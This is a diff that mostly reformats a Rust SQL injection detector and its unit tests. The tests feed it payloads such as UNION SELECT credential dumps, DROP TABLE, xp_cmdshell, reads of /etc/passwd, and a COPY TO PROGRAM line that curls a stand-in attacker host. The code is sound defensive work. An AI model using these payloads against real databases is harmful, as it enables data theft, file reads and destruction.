             if val1 == "ATTACH" && val2 == "DATABASE" {
                 detections.push(L2Detection {
                     detection_type: "db_specific_primitive".into(),
@@ -1225,13 +1398,18 @@ impl SqlStructuralEvaluator {
                     evidence: vec![ProofEvidence {
                         operation: EvidenceOperation::PayloadInject,
                         matched_input: "ATTACH DATABASE".into(),
-                        interpretation: "Input attempts to attach an external SQLite database".into(),
+                        interpretation: "Input attempts to attach an external SQLite database"
+                            .into(),
                         offset: meaningful[i].2,
                         property: "User input must not attach external databases".into(),
                     }],
                 });
             }
-            if val1 == "LOAD" && val2 == "DATA" && i+2 < meaningful.len() && meaningful[i+2].1.to_uppercase() == "INFILE" {
+            if val1 == "LOAD"
+                && val2 == "DATA"
+                && i + 2 < meaningful.len()
+                && meaningful[i + 2].1.to_uppercase() == "INFILE"
+            {
                 detections.push(L2Detection {
                     detection_type: "db_specific_primitive".into(),
                     confidence: 0.95,
@@ -1240,14 +1418,16 @@ impl SqlStructuralEvaluator {
                     evidence: vec![ProofEvidence {
                         operation: EvidenceOperation::PayloadInject,
                         matched_input: "LOAD DATA INFILE".into(),
-                        interpretation: "Input uses LOAD DATA INFILE to read arbitrary files".into(),
+                        interpretation: "Input uses LOAD DATA INFILE to read arbitrary files"
+                            .into(),
                         offset: meaningful[i].2,
-                        property: "User input must not access dangerous file read primitives".into(),
+                        property: "User input must not access dangerous file read primitives"
+                            .into(),
                     }],
                 });
             }
         }
-        
+
         detections
     }
 
@@ -1280,20 +1460,28 @@ impl SqlStructuralEvaluator {
         static FULLWIDTH_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
             Regex::new(r"[\u{FF21}-\u{FF5A}\u{FF41}-\u{FF5A}]").unwrap()
         });
-        
+
         let mut detections = Vec::new();
         if FULLWIDTH_RE.is_match(input) {
-            let normalized: String = input.chars().map(|c| {
-                let code = c as u32;
-                if code >= 0xFF01 && code <= 0xFF5E {
-                    char::from_u32(code - 0xFEE0).unwrap_or(c)
-                } else {
-                    c
-                }
-            }).collect();
-            
+            let normalized: String = input
+                .chars()
+                .map(|c| {
+                    let code = c as u32;
+                    if code >= 0xFF01 && code <= 0xFF5E {
+                        char::from_u32(code - 0xFEE0).unwrap_or(c)
+                    } else {
+                        c
+                    }
+                })
+                .collect();
+
             let upper = normalized.to_uppercase();
-            if upper.contains("UNION") || upper.contains("SELECT") || upper.contains("DROP ") || upper.contains("SLEEP(") || upper.contains("OR 1=1") {
+            if upper.contains("UNION")
+                || upper.contains("SELECT")
+                || upper.contains("DROP ")
+                || upper.contains("SLEEP(")
+                || upper.contains("OR 1=1")
+            {
                 detections.push(L2Detection {
                     detection_type: "unicode_smuggling".into(),
                     confidence: 0.93,
@@ -1314,7 +1502,8 @@ impl SqlStructuralEvaluator {
 
     fn detect_scientific_tautology(&self, input: &str) -> Vec<L2Detection> {
         static SCI_TAUT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-            Regex::new(r"(?i)\b(\d+(?:\.\d+)?e[+\-]?\d+)\s*=\s*(\d+(?:\.\d+)?e[+\-]?\d+)\b").unwrap()
+            Regex::new(r"(?i)\b(\d+(?:\.\d+)?e[+\-]?\d+)\s*=\s*(\d+(?:\.\d+)?e[+\-]?\d+)\b")
+                .unwrap()
         });
         let mut detections = Vec::new();
         for m in SCI_TAUT_RE.captures_iter(input) {
@@ -1332,7 +1521,8 @@ impl SqlStructuralEvaluator {
                         matched_input: full_match.as_str().to_owned(),
                         interpretation: "Input uses scientific notation equality tautology".into(),
                         offset: full_match.start(),
-                        property: "Boolean evaluation must not use scientific notation tautologies".into(),
+                        property: "Boolean evaluation must not use scientific notation tautologies"
+                            .into(),
                     }],
                 });
             }
@@ -1434,25 +1624,31 @@ impl SqlStructuralEvaluator {
     }
 
     fn detect_numeric_dollar_quoted_payload(&self, input: &str) -> Vec<L2Detection> {
-        static NUMERIC_TAG_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-            Regex::new(r"\$(\d{3,})\$").unwrap()
-        });
+        static NUMERIC_TAG_RE: std::sync::LazyLock<Regex> =
+            std::sync::LazyLock::new(|| Regex::new(r"\$(\d{3,})\$").unwrap());
 
         let mut detections = Vec::new();
         for caps in NUMERIC_TAG_RE.captures_iter(input) {
             let Some(opening) = caps.get(0) else { continue };
-            let Some(tag_digits) = caps.get(1) else { continue };
+            let Some(tag_digits) = caps.get(1) else {
+                continue;
+            };
             let tag = format!("${}$", tag_digits.as_str());
             let search_start = opening.end();
             let remainder = &input[search_start..];
-            let Some(rel_end) = remainder.find(&tag) else { continue };
+            let Some(rel_end) = remainder.find(&tag) else {
+                continue;
+            };
             let close_idx = search_start + rel_end;
             let full_end = close_idx + tag.len();
             let inner = &input[search_start..close_idx];
             let inner_upper = inner.to_uppercase();
-            let suspicious = ["UNION", "SELECT", "DROP", "INSERT", "UPDATE", "DELETE", "TRUNCATE", "EXECUTE", "BEGIN", "END;"]
-                .iter()
-                .any(|kw| inner_upper.contains(kw));
+            let suspicious = [
+                "UNION", "SELECT", "DROP", "INSERT", "UPDATE", "DELETE", "TRUNCATE", "EXECUTE",
+                "BEGIN", "END;",
+            ]
+            .iter()
+            .any(|kw| inner_upper.contains(kw));
             if !suspicious {
                 continue;
             }
@@ -1476,10 +1672,12 @@ impl SqlStructuralEvaluator {
 
     fn detect_like_wildcard_injection(&self, input: &str) -> Vec<L2Detection> {
         static LIKE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-            Regex::new(r"(?is)\b(?:where|and|or)\b[^;]{0,120}\blike\b\s*(?:n)?'[^']*(?:%|_)[^']*'").unwrap()
+            Regex::new(r"(?is)\b(?:where|and|or)\b[^;]{0,120}\blike\b\s*(?:n)?'[^']*(?:%|_)[^']*'")
+                .unwrap()
         });
         static BOOLEAN_LIKE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-            Regex::new(r"(?is)\b(?:or|and)\b\s+[A-Za-z_][A-Za-z0-9_\.]*\s+like\s+'%[^']*%'").unwrap()
+            Regex::new(r"(?is)\b(?:or|and)\b\s+[A-Za-z_][A-Za-z0-9_\.]*\s+like\s+'%[^']*%'")
+                .unwrap()
         });
 
         let mut detections = Vec::new();
@@ -1521,7 +1719,8 @@ impl SqlStructuralEvaluator {
             Regex::new(r"(?is);\s*(?:declare|exec(?:ute)?|waitfor|begin)\b").unwrap()
         });
         static ORACLE_BLOCK_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-            Regex::new(r"(?is)\bbegin\b[\s\S]{0,220}\bexecute\s+immediate\b[\s\S]{0,220}\bend\s*;").unwrap()
+            Regex::new(r"(?is)\bbegin\b[\s\S]{0,220}\bexecute\s+immediate\b[\s\S]{0,220}\bend\s*;")
+                .unwrap()
         });
         static MYSQL_HANDLER_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
             Regex::new(r"(?is);\s*(?:create\s+procedure|handler\s+\w+\s+open|set\s+@)").unwrap()
@@ -1684,7 +1883,11 @@ impl SqlStructuralEvaluator {
         detections
     }
 
-    fn detect_insert_update_manipulation(&self, input: &str, tokens: &[TokTuple]) -> Vec<L2Detection> {
+    fn detect_insert_update_manipulation(
+        &self,
+        input: &str,
+        tokens: &[TokTuple],
+    ) -> Vec<L2Detection> {
         static ON_DUP_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
             Regex::new(r"(?is)\bon\s+duplicate\s+key\s+update\b").unwrap()
         });
@@ -1742,11 +1945,18 @@ impl SqlStructuralEvaluator {
             });
         }
 
-        let meaningful: Vec<_> = tokens.iter().filter(|(t, _, _)| *t != SqlTokenType::Whitespace).collect();
+        let meaningful: Vec<_> = tokens
+            .iter()
+            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
+            .collect();
         for i in 0..meaningful.len().saturating_sub(3) {
             if meaningful[i].1.eq_ignore_ascii_case("INSERT")
                 && meaningful[i + 1].1.eq_ignore_ascii_case("INTO")
-                && meaningful.iter().skip(i).take(18).any(|(_, v, _)| v.eq_ignore_ascii_case("SELECT"))
+                && meaningful
+                    .iter()
+                    .skip(i)
+                    .take(18)
+                    .any(|(_, v, _)| v.eq_ignore_ascii_case("SELECT"))
             {
                 detections.push(L2Detection {
                     detection_type: "insert_update_injection".into(),
@@ -1770,8 +1980,12 @@ impl SqlStructuralEvaluator {
 }
 
 impl L2Evaluator for SqlStructuralEvaluator {
-    fn id(&self) -> &'static str { "sql_structural" }
-    fn prefix(&self) -> &'static str { "L2 SQL Structural" }
+    fn id(&self) -> &'static str {
+        "sql_structural"
+    }
+    fn prefix(&self) -> &'static str {
+        "L2 SQL Structural"
+    }
 
     #[inline]
 
@@ -1783,7 +1997,9 @@ impl L2Evaluator for SqlStructuralEvaluator {
 
         for variant in &variants {
             let stream = tokenizer.tokenize(variant);
-            let tokens: Vec<TokTuple> = stream.all().iter()
+            let tokens: Vec<TokTuple> = stream
+                .all()
+                .iter()
                 .map(|t| (t.token_type, t.value.clone(), t.start))
                 .collect();
 
@@ -1797,163 +2013,243 @@ impl L2Evaluator for SqlStructuralEvaluator {
 
             for det in self.detect_union_extraction(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_obfuscated_union(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_chr_keyword_construction(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_stacked_execution(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_time_oracle(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_error_oracle(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_comment_truncation(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_file_exec_primitives(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_catalog_exfiltration(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_case_time_oracle(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_scientific_union_bypass(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_hex_encoded_keywords(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_backtick_tautology(variant, &tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_dollar_quoted_stacked(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_mssql_bracket_exfiltration(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_mysql_versioned_comment_payload(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_order_by_time_oracle(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_window_exfiltration(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_json_extraction_abuse(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_order_by_injection(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_having_injection(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_group_by_injection(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_subquery_injection(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_second_order_injection(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_xml_abuse(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_cte_injection(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_db_specific_primitives(&tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_waf_bypass_alternative_whitespace(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_unicode_smuggling(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_scientific_tautology(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_backtick_keyword_bypass(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_multiline_comment_keyword_split(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_hex_unicode_function_abuse(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_numeric_dollar_quoted_payload(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_like_wildcard_injection(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_dbms_stacked_variant_payloads(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_boolean_blind_subquery(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_error_based_extraction_advanced(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_json_where_operator_abuse(variant) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
             for det in self.detect_insert_update_manipulation(variant, &tokens) {
                 let key = format!("{}:{}", det.detection_type, det.detail);
-                if seen.insert(key) { all_detections.push(det); }
+                if seen.insert(key) {
+                    all_detections.push(det);
+                }
             }
         }
 
@@ -2049,7 +2345,8 @@ mod tests {
         let dets = eval.detect("' UNION SELECT username, password FROM users--");
         assert!(
             dets.iter().any(|d| d.detection_type == "union_extraction"),
-            "Should detect UNION SELECT, got: {:?}", dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
+            "Should detect UNION SELECT, got: {:?}",
+            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
     }
 
@@ -2059,7 +2356,8 @@ mod tests {
         let dets = eval.detect("'; DROP TABLE users--");
         assert!(
             dets.iter().any(|d| d.detection_type == "stacked_execution"),
-            "Should detect stacked execution, got: {:?}", dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
+            "Should detect stacked execution, got: {:?}",
+            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
     }
 
@@ -2069,7 +2367,8 @@ mod tests {
         let dets = eval.detect("' OR SLEEP(5)--");
         assert!(
             dets.iter().any(|d| d.detection_type == "time_oracle"),
-            "Should detect SLEEP time oracle, got: {:?}", dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
+            "Should detect SLEEP time oracle, got: {:?}",
+            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
     }
 
@@ -2078,17 +2377,28 @@ mod tests {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("' OR 1=1--");
         assert!(
-            dets.iter().any(|d| d.detection_type == "comment_truncation"),
-            "Should detect comment truncation, got: {:?}", dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
+            dets.iter()
+                .any(|d| d.detection_type == "comment_truncation"),
+            "Should detect comment truncation, got: {:?}",
+            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
     }
 
     #[test]
     fn class_mapping() {
         let eval = SqlStructuralEvaluator;
-        assert_eq!(eval.map_class("string_termination"), Some(InvariantClass::SqlStringTermination));
-        assert_eq!(eval.map_class("union_extraction"), Some(InvariantClass::SqlUnionExtraction));
-        assert_eq!(eval.map_class("file_exec_primitive"), Some(InvariantClass::SqlStackedExecution));
+        assert_eq!(
+            eval.map_class("string_termination"),
+            Some(InvariantClass::SqlStringTermination)
+        );
+        assert_eq!(
+            eval.map_class("union_extraction"),
+            Some(InvariantClass::SqlUnionExtraction)
+        );
+        assert_eq!(
+            eval.map_class("file_exec_primitive"),
+            Some(InvariantClass::SqlStackedExecution)
+        );
         assert_eq!(eval.map_class("nonexistent"), None);
     }
 
@@ -2097,7 +2407,8 @@ mod tests {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("' UNION SELECT user,pass INTO OUTFILE '/tmp/pwned' FROM users--");
         assert!(
-            dets.iter().any(|d| d.detection_type == "file_exec_primitive"),
+            dets.iter()
+                .any(|d| d.detection_type == "file_exec_primitive"),
             "Should detect INTO OUTFILE primitive, got: {:?}",
             dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
@@ -2108,7 +2419,8 @@ mod tests {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("'; COPY users TO PROGRAM 'curl attacker'--");
         assert!(
-            dets.iter().any(|d| d.detection_type == "file_exec_primitive"),
+            dets.iter()
+                .any(|d| d.detection_type == "file_exec_primitive"),
             "Should detect COPY TO PROGRAM primitive, got: {:?}",
             dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
@@ -2119,7 +2431,8 @@ mod tests {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("' UNION SELECT table_name FROM information_schema.tables--");
         assert!(
-            dets.iter().any(|d| d.detection_type == "catalog_exfiltration"),
+            dets.iter()
+                .any(|d| d.detection_type == "catalog_exfiltration"),
             "Should detect system catalog exfiltration, got: {:?}",
             dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
@@ -2174,7 +2487,8 @@ mod tests {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("SELECT 0x756E696F6E2053454C454354");
         assert!(
-            dets.iter().any(|d| d.detection_type == "hex_keyword_encoding"),
+            dets.iter()
+                .any(|d| d.detection_type == "hex_keyword_encoding"),
             "Should detect hex-encoded SQL keyword payload, got: {:?}",
             dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
@@ -2185,7 +2499,8 @@ mod tests {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("select * from `users` where `id`=1 or 1=1");
         assert!(
-            dets.iter().any(|d| d.detection_type == "backtick_tautology"),
+            dets.iter()
+                .any(|d| d.detection_type == "backtick_tautology"),
             "Should detect backtick tautology injection, got: {:?}",
             dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
@@ -2196,7 +2511,8 @@ mod tests {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("$$; DROP TABLE users;$$");
         assert!(
-            dets.iter().any(|d| d.detection_type == "dollar_quote_stacked"),
+            dets.iter()
+                .any(|d| d.detection_type == "dollar_quote_stacked"),
             "Should detect dollar-quoted stacked payload, got: {:?}",
             dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
@@ -2207,7 +2523,8 @@ mod tests {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("SELECT * FROM [master]..[sysobjects]");
         assert!(
-            dets.iter().any(|d| d.detection_type == "mssql_bracket_exfiltration"),
+            dets.iter()
+                .any(|d| d.detection_type == "mssql_bracket_exfiltration"),
             "Should detect MSSQL bracket catalog abuse, got: {:?}",
             dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
@@ -2218,7 +2535,8 @@ mod tests {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("/*!50000UNION*/ SELECT user, password FROM users");
         assert!(
-            dets.iter().any(|d| d.detection_type == "mysql_versioned_comment"),
+            dets.iter()
+                .any(|d| d.detection_type == "mysql_versioned_comment"),
             "Should detect MySQL versioned comment payload, got: {:?}",
             dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
@@ -2229,7 +2547,8 @@ mod tests {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("ORDER BY 1,(SELECT 1 FROM users WHERE SLEEP(5))");
         assert!(
-            dets.iter().any(|d| d.detection_type == "order_by_time_oracle"),
+            dets.iter()
+                .any(|d| d.detection_type == "order_by_time_oracle"),
             "Should detect ORDER BY blind timing payload, got: {:?}",
             dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
@@ -2240,7 +2559,8 @@ mod tests {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("SELECT ROW_NUMBER() OVER (ORDER BY password) FROM users");
         assert!(
-            dets.iter().any(|d| d.detection_type == "window_exfiltration"),
+            dets.iter()
+                .any(|d| d.detection_type == "window_exfiltration"),
             "Should detect window-function sensitive ordering, got: {:?}",
             dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
@@ -2273,7 +2593,8 @@ mod tests {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("$inj$; TRUNCATE TABLE audit_log;$inj$");
         assert!(
-            dets.iter().any(|d| d.detection_type == "dollar_quote_stacked"),
+            dets.iter()
+                .any(|d| d.detection_type == "dollar_quote_stacked"),
             "Should detect tagged dollar-quoted stacked payload, got: {:?}",
             dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
         );
@@ -2283,21 +2604,30 @@ mod tests {
     fn detect_order_by_numeric_injection() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("ORDER BY 1--");
-        assert!(dets.iter().any(|d| d.detection_type == "order_by_injection"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "order_by_injection")
+        );
     }
 
     #[test]
     fn detect_order_by_sleep_injection() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("ORDER BY SLEEP(5)--");
-        assert!(dets.iter().any(|d| d.detection_type == "order_by_injection"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "order_by_injection")
+        );
     }
 
     #[test]
     fn detect_order_by_subquery_injection() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("ORDER BY (SELECT password FROM users)--");
-        assert!(dets.iter().any(|d| d.detection_type == "order_by_injection"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "order_by_injection")
+        );
     }
 
     #[test]
@@ -2311,21 +2641,30 @@ mod tests {
     fn detect_group_by_numeric_injection() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("GROUP BY 1--");
-        assert!(dets.iter().any(|d| d.detection_type == "group_by_injection"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "group_by_injection")
+        );
     }
 
     #[test]
     fn detect_subquery_injection_standalone() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("(SELECT password FROM users)");
-        assert!(dets.iter().any(|d| d.detection_type == "subquery_injection"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "subquery_injection")
+        );
     }
 
     #[test]
     fn detect_second_order_injection() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("'||(SELECT password FROM users)||'");
-        assert!(dets.iter().any(|d| d.detection_type == "second_order_injection"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "second_order_injection")
+        );
     }
 
     #[test]
@@ -2346,35 +2685,50 @@ mod tests {
     fn detect_postgres_lo_import() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("SELECT lo_import('/etc/passwd')--");
-        assert!(dets.iter().any(|d| d.detection_type == "db_specific_primitive"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "db_specific_primitive")
+        );
     }
 
     #[test]
     fn detect_mysql_load_data_infile() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("LOAD DATA INFILE '/etc/passwd' INTO TABLE users--");
-        assert!(dets.iter().any(|d| d.detection_type == "db_specific_primitive"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "db_specific_primitive")
+        );
     }
 
     #[test]
     fn detect_mssql_xp_cmdshell() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("EXEC xp_cmdshell 'whoami'--");
-        assert!(dets.iter().any(|d| d.detection_type == "db_specific_primitive"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "db_specific_primitive")
+        );
     }
 
     #[test]
     fn detect_sqlite_attach_database() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("ATTACH DATABASE '/tmp/evil.db' AS evil--");
-        assert!(dets.iter().any(|d| d.detection_type == "db_specific_primitive"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "db_specific_primitive")
+        );
     }
 
     #[test]
     fn detect_alternative_whitespace_waf_bypass() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("UNION\x0BSELECT\x0C1--");
-        assert!(dets.iter().any(|d| d.detection_type == "alt_whitespace_bypass"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "alt_whitespace_bypass")
+        );
     }
 
     #[test]
@@ -2388,140 +2742,202 @@ mod tests {
     fn detect_scientific_notation_tautology() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("1e0=1e0--");
-        assert!(dets.iter().any(|d| d.detection_type == "scientific_tautology"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "scientific_tautology")
+        );
     }
 
     #[test]
     fn detect_backtick_keyword_union_select_bypass() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("`union` `select` username,password from users");
-        assert!(dets.iter().any(|d| d.detection_type == "backtick_keyword_bypass"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "backtick_keyword_bypass")
+        );
     }
 
     #[test]
     fn detect_backtick_keyword_union_all_select_bypass() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("`union` `all` `select` 1,2");
-        assert!(dets.iter().any(|d| d.detection_type == "backtick_keyword_bypass"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "backtick_keyword_bypass")
+        );
     }
 
     #[test]
     fn detect_comment_split_union_multiline() {
         let eval = SqlStructuralEvaluator;
         let dets = eval.detect("u/**/n/**/i/**/o/**/n select 1");
-        assert!(dets.iter().any(|d| d.detection_type == "comment_keyword_split"));
+        assert!(
